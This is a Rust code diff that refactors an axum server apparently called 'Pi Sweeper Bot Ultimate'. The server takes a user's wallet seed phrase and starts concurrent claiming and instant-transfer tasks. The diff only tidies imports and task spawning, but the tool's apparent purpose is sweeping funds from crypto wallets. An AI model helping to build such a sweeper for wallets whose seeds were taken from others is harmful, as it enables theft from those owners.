@@ -1,13 +1,13 @@
 use axum::{
-    extract::{Query, State},
+    extract::State,
     http::StatusCode,
     response::sse::{Event, Sse},
     Json,
 };
-use chrono::{DateTime, Utc};
+use chrono::Utc;
 use futures_util::stream::Stream;
 use serde::{Deserialize, Serialize};
-use std::{convert::Infallible, time::Duration};
+use std::convert::Infallible;
 use tokio_stream::{wrappers::BroadcastStream, StreamExt};
 use uuid::Uuid;
 
@@ -37,7 +37,7 @@ pub struct ClaimRequest {
 }
 
 pub async fn login(
-    State(state): State<AppState>,
+    State(_state): State<AppState>,
     Json(request): Json<LoginRequest>,
 ) -> Result<Json<LoginResponse>, StatusCode> {
     // Validate seed phrase (basic validation)
@@ -53,7 +53,7 @@ pub async fn login(
         last_activity: Utc::now(),
     };
 
-    state.active_sessions.insert(session_id.clone(), session);
+    _state.active_sessions.insert(session_id.clone(), session);
 
     Ok(Json(LoginResponse {
         success: true,
@@ -62,8 +62,7 @@ pub async fn login(
 }
 
 pub async fn get_balance(
-    State(state): State<AppState>,
-    // In a real implementation, you'd extract the session from headers
+    State(_state): State<AppState>,
 ) -> Result<Json<pi_network::BalanceInfo>, StatusCode> {
     // Mock balance for now
     let balance = pi_network::BalanceInfo {
@@ -85,8 +84,6 @@ pub async fn withdraw(
     State(state): State<AppState>,
     Json(request): Json<WithdrawRequest>,
 ) -> Result<Json<TransactionResponse>, StatusCode> {
-    use std::sync::atomic::Ordering;
-
     // Start concurrent claiming and transfer
     let claiming_engine = state.claiming_engine.clone();
     let transfer_engine = state.transfer_engine.clone();
@@ -97,15 +94,13 @@ pub async fn withdraw(
 
     // Start claiming if sponsor seed is provided
     if let Some(sponsor_seed) = request.sponsor_seed {
-        let claiming_handle = tokio::spawn({
-            let claiming_engine = claiming_engine.clone();
-            let wallet_seed = wallet_seed.clone();
-            let log_sender = log_sender.clone();
-            async move {
-                claiming_engine
-                    .start_claiming_with_sponsor(wallet_seed, sponsor_seed, log_sender)
-                    .await
-            }
+        let claiming_engine = claiming_engine.clone();
+        let wallet_seed = wallet_seed.clone();
+        let log_sender = log_sender.clone();
+        tokio::spawn(async move {
+            let _ = claiming_engine
+                .start_claiming_with_sponsor(wallet_seed, sponsor_seed, log_sender)
+                .await;
         });
     }
 
@@ -117,15 +112,13 @@ pub async fn withdraw(
         memo: Some("Pi Sweeper Bot Ultimate".to_string()),
     };
 
-    let transfer_handle = tokio::spawn({
-        let transfer_engine = transfer_engine.clone();
-        let wallet_seed = wallet_seed.clone();
-        let log_sender = log_sender.clone();
-        async move {
-            transfer_engine
-                .start_instant_transfer(wallet_seed, transfer_request, log_sender)
-                .await
-        }
+    let transfer_engine = transfer_engine.clone();
+    let wallet_seed = wallet_seed.clone();
+    let log_sender = log_sender.clone();
+    tokio::spawn(async move {
+        let _ = transfer_engine
+            .start_instant_transfer(wallet_seed, transfer_request, log_sender)
+            .await;
     });
 
     // Don't wait for completion, return immediately
